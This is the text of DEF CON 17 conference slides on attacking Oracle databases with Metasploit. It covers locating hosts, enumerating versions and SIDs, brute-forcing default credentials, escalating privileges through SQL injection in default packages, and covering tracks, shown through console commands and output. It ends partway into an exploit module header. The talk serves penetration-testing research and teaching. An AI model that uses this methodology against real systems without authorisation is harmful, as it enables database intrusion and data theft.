Attacking Oracle 
with the
Metasploit Framework
defcon 17
Who Are We?
Chris Gates
What pays the bills
Pentester for 
Security Blogger
http://carnal0wnage.attackresearch.com
Security Twit
Carnal0wnage
Want more? 
Chris Gates + carnal0wnage + maltego 
Who Are We?
Mario Ceballos
• What do I do?
Vulnerability Research/Exploit Development.
Metasploit Framework Developer.
Focus is on auxiliary and exploit modules.
Pentesting for some company.
Why Oracle?
Why the focus on Oracle?
Been on lots of pentests & seen lots of potential 
targets.
The Oracle business model allows for free 
downloads of products, but you pay for updates. The 
result is tons of potential shells.
Privilege Escalation and data theft is pretty easy, but 
shells are always better.
Why Oracle?
Why the focus on Oracle?
Some support is provided by the commercial attack 
frameworks, but really don’t have much coverage for 
non-memory corruption vulns.
Other tools that target Oracle.
Inguma
Orasploit (not public)‏
Pangolin (if you want to give your hard earned shell back to 
.cn)‏
A  few free commercial products focused on vulnerability 
assessment rather than exploitation.
Current Metasploit Support
Some support for Oracle is already provided.
Exploit modules.
Handful of memory corruption modules that target earlier 
versions of Oracle and some of if its other applications. 
Auxiliary modules.
Handful of modules that assist in discovering the SID, 
Identifying the version, sql injection, post exploitation, and 
a ntlm stealer.  
New Metasploit Support
Introduction of a TNS Mixin.
Handles a basic TNS packet structure.
"(CONNECT_DATA=(COMMAND=#{command}))”
Used for some of our auxiliary modules.
Used for our TNS exploits.
Introduction of a ORACLE Mixin.
Handles our direct database access.
Dependencies:
Oracle Instant Client.
ruby-dbi.
ruby-oci8.
New Metasploit Support (cont.)‏
Introduction of a ORACLE Mixin.
Exposes a few methods.
connect()‏
Establishes a database handle.
disconnect()‏
Disconnect all database handles.
preprare_exec()‏
Prepares a statement then executes it.
New Metasploit Support (cont.)‏
Introduction of a ORACLE Mixin.
Really makes things simple.
msf auxiliary(sql) > set SQL "select * from global_name"
SQL => select * from global_name
msf auxiliary(sql) > run
[*] Sending SQL...
[*] ORCL.REGRESS.RDBMS.DEV.US.ORACLE.COM
[*] Done...
[*] Auxiliary module execution completed
msf auxiliary(sql) > 
Oracle Attack Methodology
We need 4 things to connect to an Oracle DB.
IP.
Port.
Service Identifier (SID).
Username/Password.
Oracle Attack Methodology
Locate Oracle Systems.
Determine Oracle Version.
Determine Oracle SID.
Guess/Bruteforce USER/PASS.
Privilege Escalation via SQL Injection.
Manipulate Data/Post Exploitation.
Cover Tracks.
Oracle Attack Methodology
Locate Oracle Systems
Nmap.
Information Disclosure Vulns.
Google.
Locate Oracle Systems
Nmap.
Look for common oracle ports 1521-1540,1158,5560
cg@attack:~$ nmap -sV 192.168.0.100 -p 1521
Interesting ports on 192.168.0.100:
PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS Listener
Locate Oracle Systems
Google.
Google dorks to locate Oracle systems.
intitle:iSQL intitle:Release inurl:isqlplus intitle:10.1
inurl:pls/portal
"Index of"  "Oracle-HTTP-Server" Server at Port "Last modified" 1.3.12
www.red-database-security.com/wp/google_oracle_hacking_us.pdf 
Yahoo dorks? to locate Oracle systems.
intitle:iSQL intitle:Release inurl:isqlplus
inurl:pls/portal
“Oracle-HTTP-Server" Server at Port "Last modified" 1.3.12
www.red-database-security.com/wp/yahoo_oracle_hacking_us.pdf
Locate Oracle Systems
Sometimes they come pre-0wned. 
Oracle Attack Methodology
Locate a system running Oracle.
Determine Oracle Version.
Determine Oracle SID.
Guess/Bruteforce USER/PASS.
Privilege Escalation via PL/SQL Injection.
Manipulate Data/Post Exploitation.
Cover Tracks.
Oracle Attack Methodology
Determine Oracle Version.
tns_packet(“(CONNECT_DATA=(COMMAND=VERSION))”)‏
msf auxiliary(tnslsnr_version) > set RHOSTS 172.10.1.107-172.10.1.110
RHOSTS => 172.10.1.107-172.10.1.110
msf auxiliary(tnslsnr_version) > run
[*] Host 172.10.1.107 is running: Solaris: Version 9.2.0.1.0 – Production
[*] Host 172.10.1.108 is running: Linux: Version 11.1.0.6.0 - Production
[*] Host 172.10.1.109 is running: 32-bit Windows: Version 10.2.0.1.0 - Production
[*] Auxiliary module execution completed
msf auxiliary(tnslsnr_version) > db_notes
[*] Time: Fri May 29 16:09:41 -0500 2009 Note: host=172.10.1.107 type=VERSION Solaris: 
Version 9.2.0.1.0 – Production
…
[*] Time: Fri May 29 16:09:44 -0500 2009 Note: host=172.10.1.109 type=VERSION data=32-
bit Windows: Version 10.2.0.1.0 - Production
msf auxiliary(tnslsnr_version) > 
Oracle Attack Methodology
Locate a system running Oracle.
Determine Oracle Version.
Determine Oracle SID.
Guess/Bruteforce USER/PASS.
Privilege Escalation via SQL Injection.
Manipulate Data/Post Exploitation.
Cover Tracks.
Oracle Attack Methodology
Determine Oracle Service Identifier (SID).
tns_packet(“(CONNECT_DATA=(COMMAND=STATUS))”)‏
By querying the TNS Listener directly, brute force for 
default SID's or query other components that may 
contain it. 
msf auxiliary(sid_enum) > run 
[*] Identified SID for 172.10.1.107: PLSExtProc
[*] Identified SID for 172.10.1.107 : acms
[*] Identified SERVICE_NAME for 172.10.1.107 : PLSExtProc
[*] Identified SERVICE_NAME for 172.10.1.107 : acms
[*] Auxiliary module execution completed 
msf auxiliary(sid_enum) > run
[-] TNS listener protected for 172.10.1.109... 
[*] Auxiliary module execution completed 
Oracle Attack Methodology
Determine Oracle SID.
By quering the TNS Listener directly, brute force for 
default SID's or query other components that may 
contain it. 
msf auxiliary(sid_brute) > run
[*] Starting brute force on 172.10.1.109, using sids
from /home/cg/evil/msf3/dev/data/exploits/sid.txt...
[*] Found SID 'ORCL' for host 172.10.1.109.
[*] Auxiliary module execution completed 
Oracle Attack Methodology
Determine Oracle SID.
By quering the TNS Listener directly, brute force for 
default SID's or query other components that may 
contain it. 
msf auxiliary(sid_enum) > run 
[-] TNS listener protected for 172.10.1.108... 
[*] Auxiliary module execution completed 
msf auxiliary(sid_enum) > use auxiliary/scanner/oracle/spy_sid 
msf auxiliary(spy_sid) > run 
[*] Discovered SID: ‘orcl' for host 172.10.1.108
[*] Auxiliary module execution completed 
msf auxiliary(spy_sid) > 
Oracle Attack Methodology
Determine Oracle SID.
Enterprise Manger Console.
Oracle Attack Methodology
Determine Oracle SID.
Enterprise Manager Console.
Query other components that may contain it. 
msf auxiliary(sid_enum) > run 
[-] TNS listener protected for 172.10.1.108... 
[*] Auxiliary module execution completed 
msf auxiliary(sid_enum) > use auxiliary/scanner/oracle/oas_sid
msf auxiliary(oas_sid) > run 
[*] Discovered SID: ‘orcl' for host 172.10.1.109
[*] Auxiliary module execution completed 
msf auxiliary(oas_sid) > 
Oracle Attack Methodology
Locate a system running Oracle.
Determine Oracle Version.
Determine Oracle SID.
Guess/Bruteforce USER/PASS.
Privilege Escalation via SQL Injection.
Manipulate Data/Post Exploitation.
Cover Tracks.
Oracle Attack Methodology
Determine Oracle Username/Password.
Brute Force For Known Default  Accounts.
msf auxiliary(brute_login) > set SID ORCL
SID => ORCL
msf auxiliary(brute_login) > run
.
[-] ORA-01017: invalid username/password; logon denied
[-] ORA-01017: invalid username/password; logon denied
[*] Auxiliary module execution completed
msf auxiliary(brute_login) > db_notes
[*] Time: Sat May 30 08:44:09 -0500 2009 Note: host=172.10.1.109 
type=BRUTEFORCED_ACCOUNT data=SCOTT/TIGER
Oracle Attack Methodology
Locate a system running Oracle.
Determine Oracle Version.
Determine Oracle SID.
Guess/Bruteforce USER/PASS.
Privilege Escalation via SQL Injection.
Manipulate Data/Post Exploitation.
Cover Tracks.
Oracle Attack Methodology
Privilege Escalation via SQL Injection.
SQL Injection in default Oracle packages.
A good chunk of it executable by public! 
Regular SQLI requires CREATE PROCEDURE privilege  
which most default accounts possess.
Cursor SQLI only requires CREATE SESSION privilege.
Privilege Escalation
The code.
def initialize(info = {})super(update_info(info,
'Name'           => 'SQL Injection via SYS.LT.FINDRICSET.',
'Description'    => %q{snip...
'Author'         => [ 'MC' ],
'License'        => MSF_LICENSE,
'Version'        => '$Revision:$',